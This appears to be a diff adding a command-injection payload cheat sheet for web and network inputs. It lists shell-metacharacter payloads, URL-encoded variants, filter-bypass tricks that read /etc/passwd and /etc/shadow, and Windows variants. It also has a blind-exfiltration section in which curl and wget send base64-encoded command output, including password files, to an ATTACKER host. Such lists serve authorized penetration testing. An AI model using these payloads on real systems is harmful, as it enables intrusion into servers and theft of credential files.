@@ -1,0 +1,83 @@
+# === COMMAND INJECTION PAYLOADS ===
+# Test in: ping fields, hostname inputs, filename inputs, email, any "execute" functionality
+# Append to legitimate value (e.g. 127.0.0.1; id) or replace entirely
+
+
+# --- Detection (look for command output or time delay) ---
+; id
+| id
+& id
+&& id
+|| id
+`id`
+$(id)
+; sleep 5
+| sleep 5
+`sleep 5`
+$(sleep 5)
+
+
+# --- Append to legitimate input ---
+127.0.0.1; id
+127.0.0.1 | id
+127.0.0.1 & id
+127.0.0.1 && id
+127.0.0.1 || id
+127.0.0.1`id`
+127.0.0.1$(id)
+test@test.com; id
+filename.txt; id
+
+
+# --- URL-encoded (for URL params) ---
+127.0.0.1%3Bid      # ; id
+127.0.0.1%7Cid      # | id
+127.0.0.1%26id      # & id
+127.0.0.1%60id%60   # `id`
+
+
+# --- Blind exfil (when output not shown) ---
+# Run listener first: python3 -m http.server 8080
+; curl http://ATTACKER:8080/$(id|base64)
+; wget http://ATTACKER:8080/$(id|base64)
+`curl http://ATTACKER:8080/$(id|base64)`
+$(curl http://ATTACKER:8080/$(id|base64))
+
+# Useful commands to run via exfil
+; curl http://ATTACKER:8080/$(cat /etc/passwd|base64)
+; curl http://ATTACKER:8080/$(ls /|base64)
+; curl http://ATTACKER:8080/$(whoami|base64)
+
+
+# --- Filter bypass: no spaces ---
+# Use ${IFS} as space substitute
+;id${IFS}-a
+cat${IFS}/etc/passwd
+;cat${IFS}/etc/shadow
+
+# Use < for redirection instead of space
+cat</etc/passwd
+
+# Use brace expansion
+{cat,/etc/passwd}
+
+
+# --- Filter bypass: no slash ---
+cat${PATH:0:1}etc${PATH:0:1}passwd
+
+
+# --- Filter bypass: blacklisted chars ---
+# Split commands
+c'a't /etc/passwd
+c"a"t /etc/passwd
+who$@ami
+
+
+# --- Windows ---
+& whoami
+| whoami
+; whoami
+%26 whoami
+%7C whoami
+& dir
+& type C:\Windows\win.ini
